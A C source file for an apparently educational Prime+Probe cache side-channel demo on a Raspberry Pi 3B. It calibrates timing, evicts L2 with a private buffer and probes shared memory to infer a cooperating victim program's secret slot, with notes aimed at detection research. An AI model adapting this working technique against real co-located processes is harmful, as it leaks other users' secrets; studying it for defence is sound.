/*
 * attacker.c  –  Prime+Probe Demo  (Raspberry Pi 3B, ARMv8 / Cortex-A53)
 * VERSION 4 – correct Prime+Probe architecture with separate eviction buffer.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * HISTORY OF BUGS AND FIXES
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * V1 bug: timing used ioctl(perf_fd) inside hot loop → ~9500 cy overhead
 *         per slot from syscall cost, burying the ~200 cy cache-miss signal.
 *         Fix: use inline "mrs cntvct_el0" (zero-syscall timer).
 *
 * V2 bug: per-cache-line timing with ISB before each read → ISB pipeline
 *         flush cost (~1-2 ticks @ 52 ns/tick) dominated actual load time.
 *         All slots appeared equal (~500 ns), miscount 0-5/200.
 *         Fix: bracket entire 64-line slot with ONE timer pair.
 *
 * V3 bug: prime buffer = shared buffer = 64 KB.  L2 is 512 KB 16-way.
 *         64 KB << 512 KB, so priming only filled 1/8th of the cache.
 *         Victim's lines stayed alive in the other 7/8ths of L2.
 *         Symptom: slot 11 (actual secret) had LOWEST latency (458 ns)
 *         because victim just warmed it — prime never evicted it.
 *         Fix: allocate a separate PRIVATE eviction buffer of 2× L2 size
 *         (1 MB) for the PRIME phase.  Only shared memory used for PROBE.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * CORRECT Prime+Probe SIGNAL POLARITY
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * After PRIME the entire L2 is filled with eviction-buffer data.
 * ALL shared-memory slots are cold (in DRAM).
 *
 * During WAIT the victim runs and loads slot[secret] into L2.
 * ONLY slot[secret] is now warm; everything else stays cold.
 *
 * During PROBE:
 *   slot[secret] → L2 hit  → FAST probe time  ← this is the secret
 *   slot[other]  → DRAM miss → SLOW probe time
 *
 * INFERENCE = slot with MINIMUM average probe latency.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * CACHE GEOMETRY (Pi 3B, Cortex-A53)
 * ═══════════════════════════════════════════════════════════════════════════
 *  L1-D : 32 KB,  4-way,  64-byte lines → 128 sets
 *  L2   : 512 KB, 16-way, 64-byte lines → 512 sets
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sched.h>

/* ── tunables (must match victim.c) ────────────────────────────────────── */
#define SHM_NAME        "/pp_demo_shm"
#define NUM_SECRETS     16
#define SLOT_SIZE       4096
#define TOTAL_SHM_SIZE  (NUM_SECRETS * SLOT_SIZE)   /* 64 KB */

/* ── cache geometry ────────────────────────────────────────────────────── */
#define CACHE_LINE          64
#define L2_SIZE             (512 * 1024)
/*
 * EVICTION_BUF_SIZE = 2 × L2_SIZE = 1 MB
 *
 * A 1 MB stride over PRIVATE pages brings 32 new lines into each of the
 * 512 L2 sets, replacing all 16 ways twice over — guaranteeing full eviction
 * regardless of LRU/PLRU replacement policy.
 */
#define EVICTION_BUF_SIZE   (2 * L2_SIZE)

/* ── timing ────────────────────────────────────────────────────────────── */
#define TIMER_FREQ_FALLBACK  19200000ULL
#define HIT_THRESHOLD_NS     5000ULL    /* slots BELOW this = L2 hit = secret */
#define WAIT_US              50000       /* 50 ms between prime and probe */
#define NUM_ITERATIONS       300

/* ── inline timer ───────────────────────────────────────────────────────── */

/*
 * read_timer() – single "mrs cntvct_el0" instruction, no syscall.
 * ISB serialises pipeline to prevent speculative/out-of-order timestamps.
 */
static inline uint64_t read_timer(void)
{
    uint64_t val;
    __asm__ volatile("isb\n\tmrs %0, cntvct_el0" : "=r"(val) : : "memory");
    return val;
}

static inline uint64_t read_timer_freq(void)
{
    uint64_t f;
    __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(f));
    return f ? f : TIMER_FREQ_FALLBACK;
}

static inline uint64_t ticks_to_ns(uint64_t ticks, uint64_t freq_hz)
{
    return (ticks * 1000000000ULL) / freq_hz;
}

/* ── perf HPC counter (for PhD students, non-fatal) ─────────────────────── */

static int open_cycle_counter(void)
{
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type    = PERF_TYPE_HARDWARE;
    pe.size    = sizeof(pe);
    pe.config  = PERF_COUNT_HW_CPU_CYCLES;
    pe.disabled = 1;
    pe.exclude_hv = 1;
    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd == -1) perror("[attacker] perf_event_open (non-fatal)");
    return fd;
}

/* ── calibration ─────────────────────────────────────────────────────────── */

/*
 * calibrate()
 * -----------
 * Measures full 64-line slot latency for a known L2 HIT and DRAM MISS
 * using the same single-bracket timing as probe_slot().
 * Returns threshold = midpoint between hit and miss latency.
 */
static uint64_t calibrate(volatile uint8_t *buf, uint64_t freq_hz)
{
    const int N = 300;
    uint64_t hit_total = 0, miss_total = 0;

    for (int i = 0; i < N; i++) {
        /* Warm 64 lines into L2 */
        for (size_t o = 0; o < SLOT_SIZE; o += CACHE_LINE) {
            (void)buf[o]; __asm__ volatile("" ::: "memory");
        }
        __asm__ volatile("dsb sy\nisb" ::: "memory");

        /* Time L2 HIT (second pass) */
        __asm__ volatile("isb" ::: "memory");
        uint64_t t0 = read_timer();
        for (size_t o = 0; o < SLOT_SIZE; o += CACHE_LINE) {
            (void)buf[o]; __asm__ volatile("" ::: "memory");
        }
        __asm__ volatile("dsb sy" ::: "memory");
        hit_total += ticks_to_ns(read_timer() - t0, freq_hz);

        /* Flush all 64 lines to DRAM using DC CIVAC */
        for (size_t o = 0; o < SLOT_SIZE; o += CACHE_LINE)
            __asm__ volatile("dc civac, %0" : : "r"(buf + o) : "memory");
        __asm__ volatile("dsb sy\nisb" ::: "memory");

        /* Time DRAM MISS (cold read after flush) */
        __asm__ volatile("isb" ::: "memory");
        uint64_t t2 = read_timer();
        for (size_t o = 0; o < SLOT_SIZE; o += CACHE_LINE) {
            (void)buf[o]; __asm__ volatile("" ::: "memory");
        }
        __asm__ volatile("dsb sy" ::: "memory");
        miss_total += ticks_to_ns(read_timer() - t2, freq_hz);
    }

    uint64_t hit_ns  = hit_total  / N;
    uint64_t miss_ns = miss_total / N;

    printf("[attacker] Calibration: L2-hit = %lu ns  |  DRAM-miss = %lu ns\n",
           (unsigned long)hit_ns, (unsigned long)miss_ns);

    if (miss_ns <= hit_ns + 200) {
        printf("[attacker] WARNING: gap too small; DC CIVAC may be no-op.\n");
        printf("[attacker] Using default threshold %llu ns.\n",
               (unsigned long long)HIT_THRESHOLD_NS);
        return HIT_THRESHOLD_NS;
    }

    uint64_t thr = (hit_ns + miss_ns) / 2;
    printf("[attacker] Threshold: %lu ns  (midpoint; secret slot = BELOW this)\n\n",
           (unsigned long)thr);
    return thr;
}

/* ── prime ──────────────────────────────────────────────────────────────── */

/*
 * prime()
 * -------
 * Strides through 1 MB of PRIVATE anonymous memory to evict the entire L2.
 *
 * After this call:
 *   - L2 is filled with eviction-buffer data (private, unrelated to victim).
 *   - All shared spy-buffer lines are COLD (in DRAM).
 *   - The victim has not yet had a chance to re-warm anything.
 *
 * Two passes ensure PLRU replacement policy evicts every way.
 */
static void prime(volatile uint8_t *evict_buf)
{
    for (int pass = 0; pass < 2; pass++) {
        for (size_t off = 0; off < EVICTION_BUF_SIZE; off += CACHE_LINE) {
            (void)evict_buf[off];
            __asm__ volatile("" ::: "memory");
        }
    }
    __asm__ volatile("dsb sy\nisb" ::: "memory");
}

/* ── probe ──────────────────────────────────────────────────────────────── */

/*
 * probe_slot()
 * ------------
 * Times reloading 64 cache lines of one spy-buffer slot.
 *
 * Signal polarity after a correct prime+wait:
 *   victim's slot → L2 hit  → FAST (low ns)   ← this is the secret
 *   other slots   → DRAM miss → SLOW (high ns)
 *
 * Uses a single ISB+timer bracket over all 64 reads (no per-line ISB).
 */
static uint64_t probe_slot(volatile uint8_t *shm_base, int slot_idx,
                            uint64_t freq_hz)
{
    volatile uint8_t *slot = shm_base + (size_t)slot_idx * SLOT_SIZE;

    __asm__ volatile("isb" ::: "memory");
    uint64_t t0 = read_timer();

    for (size_t off = 0; off < SLOT_SIZE; off += CACHE_LINE) {
        (void)slot[off];
        __asm__ volatile("" ::: "memory");
    }

    __asm__ volatile("dsb sy" ::: "memory");
    uint64_t t1 = read_timer();

    return ticks_to_ns(t1 - t0, freq_hz);
}

/* ── stats ───────────────────────────────────────────────────────────────── */

typedef struct {
    uint64_t ns_sum;    /* cumulative probe time (lower = more often a hit) */
    uint64_t hit_count; /* times probe was below threshold (= L2 hit count) */
} SlotStats;

/* ── display ─────────────────────────────────────────────────────────────── */

static void print_results(SlotStats stats[], int n, int inferred,
                           uint64_t thr, int iters)
{
    uint64_t min_avg = UINT64_MAX, max_avg = 0;
    for (int i = 0; i < n; i++) {
        uint64_t a = stats[i].ns_sum / (uint64_t)iters;
        if (a < min_avg) min_avg = a;
        if (a > max_avg) max_avg = a;
    }
    uint64_t range = (max_avg > min_avg) ? (max_avg - min_avg) : 1;

    printf("\n  Threshold: %lu ns  (BELOW = L2 hit = secret slot)\n", (unsigned long)thr);
    printf("  ┌──────────────────────────────────────────────────────────────┐\n");
    printf("  │   SHORT bar = FAST = L2 hit = SECRET                         │\n");
    printf("  │   LONG  bar = SLOW = DRAM miss = not secret                  │\n");
    printf("  ├──────┬──────────┬────────────────────────────────────────────┤\n");
    printf("  │ Slot │  Avg ns  │ Latency (shorter = faster = secret)         │\n");
    printf("  ├──────┼──────────┼────────────────────────────────────────────┤\n");

    for (int i = 0; i < n; i++) {
        uint64_t avg = stats[i].ns_sum / (uint64_t)iters;
        int bar = (int)(((avg - min_avg) * 40) / range);
        char b[44]; memset(b, '#', bar); b[bar] = '\0';
        printf("  │ %3d  │ %8lu │ %-40s │%s\n",
               i, (unsigned long)avg, b,
               (i == inferred) ? " <<< INFERRED SECRET" : "");
    }
    printf("  └──────┴──────────┴────────────────────────────────────────────┘\n");
}

/* ── signal ──────────────────────────────────────────────────────────────── */
static volatile int keep_running = 1;
static void handle_sigint(int s) { (void)s; keep_running = 0; }

/* ── main ────────────────────────────────────────────────────────────────── */

int main(void)
{
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║   Prime+Probe Cache Side-Channel Demo v4 (ARMv8)        ║\n");
    printf("║   Pi 3B Cortex-A53 | CNTVCT_EL0 | 1MB eviction buffer  ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    /* 1. Timer frequency */
    uint64_t freq_hz = read_timer_freq();
    printf("[attacker] Timer: %llu Hz (%.1f MHz) = %.1f ns/tick\n\n",
           (unsigned long long)freq_hz,
           (double)freq_hz / 1e6,
           1e9 / (double)freq_hz);

    /* 2. HPC counter for PhD detection work */
    int pmu_fd = open_cycle_counter();
    if (pmu_fd >= 0)
        printf("[attacker] HPC fd=%d  →  run: perf stat -p %d -e cache-misses,cycles\n\n",
               pmu_fd, getpid());

    /* 3. Allocate 1 MB private eviction buffer */
    printf("[attacker] Allocating %d KB private eviction buffer …\n",
           (int)(EVICTION_BUF_SIZE / 1024));
    volatile uint8_t *evict_buf = mmap(NULL, EVICTION_BUF_SIZE,
                                       PROT_READ | PROT_WRITE,
                                       MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (evict_buf == MAP_FAILED) { perror("mmap evict"); return 1; }
    /* Fault in all pages so no page-fault jitter during prime */
    memset((void *)evict_buf, 0xCC, EVICTION_BUF_SIZE);
    printf("[attacker] Eviction buffer ready at %p\n\n", (void *)evict_buf);

    /* 4. Open shared memory */
    printf("[attacker] Waiting for victim to create shared memory …\n");
    int shm_fd = -1;
    for (int a = 0; a < 100 && shm_fd == -1; a++) {
        shm_fd = shm_open(SHM_NAME, O_RDWR, 0);
        if (shm_fd == -1) { printf("."); fflush(stdout); usleep(100000); }
    }
    if (shm_fd == -1) { fprintf(stderr, "\nshm not found.\n"); return 1; }
    printf("\n[attacker] Shared memory opened fd=%d\n", shm_fd);

    /* 5. Map shared spy buffer */
    volatile uint8_t *shm_base = mmap(NULL, TOTAL_SHM_SIZE,
                                      PROT_READ | PROT_WRITE,
                                      MAP_SHARED, shm_fd, 0);
    if (shm_base == MAP_FAILED) { perror("mmap shm"); return 1; }
    printf("[attacker] Spy buffer at %p (%d KB)\n\n",
           (void *)shm_base, (int)(TOTAL_SHM_SIZE / 1024));

    /* 6. Calibrate */
    printf("[attacker] Calibrating hit/miss threshold …\n");
    uint64_t threshold_ns = calibrate(shm_base, freq_hz);

    printf("[attacker] Ready. %d iterations, wait=%d µs\n", NUM_ITERATIONS, WAIT_US);
    printf("[attacker] SECRET slot will appear as SHORTEST bar / LOWEST ns.\n\n");

    /* 7. Stats */
    SlotStats stats[NUM_SECRETS];
    memset(stats, 0, sizeof(stats));
    signal(SIGINT, handle_sigint);

    /* 8. Main attack loop */
    int iter;
    for (iter = 0; iter < NUM_ITERATIONS && keep_running; iter++) {

        /* PRIME: stride 1 MB private buffer → evicts entire 512 KB L2 */
        prime(evict_buf);

        /* WAIT: victim wakes and warms slot[secret] into L2 */
        sched_yield();
        usleep(WAIT_US);

        /* PROBE: time each slot; secret will be the fastest */
        for (int s = 0; s < NUM_SECRETS; s++) {
            uint64_t ns = probe_slot(shm_base, s, freq_hz);
            stats[s].ns_sum += ns;
            if (ns < threshold_ns)
                stats[s].hit_count++;
        }

        if (iter % 30 == 0) {
            printf("[attacker] iter %3d/%d\n", iter + 1, NUM_ITERATIONS);
            fflush(stdout);
        }
    }

    /* 9. Inference: highest hit_count = fastest slot = victim's secret */
    int inferred = 0;
    uint64_t max_hits = 0, min_sum = UINT64_MAX;
    for (int s = 0; s < NUM_SECRETS; s++) {
        if (stats[s].hit_count > max_hits ||
            (stats[s].hit_count == max_hits && stats[s].ns_sum < min_sum)) {
            max_hits = stats[s].hit_count;
            min_sum  = stats[s].ns_sum;
            inferred = s;
        }
    }

    /* 10. Display */
    printf("\n══════════════════════════════════════════════════════════\n");
    printf("  RESULTS after %d iterations\n", iter);
    printf("══════════════════════════════════════════════════════════\n");
    print_results(stats, NUM_SECRETS, inferred, threshold_ns, iter);

    printf("\n  Hit counts (HIGHER = more often L2-hot = secret candidate):\n  ");
    for (int s = 0; s < NUM_SECRETS; s++) {
        printf("[%2d]=%3lu  ", s, (unsigned long)stats[s].hit_count);
        if ((s + 1) % 4 == 0) printf("\n  ");
    }
    printf("\n");
    printf("  ╔══════════════════════════════════════════════╗\n");
    printf("  ║  INFERRED SECRET : %-3d  (L2-hit rate %3lu%%)  ║\n",
           inferred, (unsigned long)(max_hits * 100 / (uint64_t)iter));
    printf("  ╚══════════════════════════════════════════════╝\n\n");

    /* 11. Cleanup */
    munmap((void *)evict_buf, EVICTION_BUF_SIZE);
    munmap((void *)shm_base,  TOTAL_SHM_SIZE);
    close(shm_fd);
    if (pmu_fd >= 0) close(pmu_fd);
    shm_unlink(SHM_NAME);
    printf("[attacker] Done.\n");
    return 0;
}

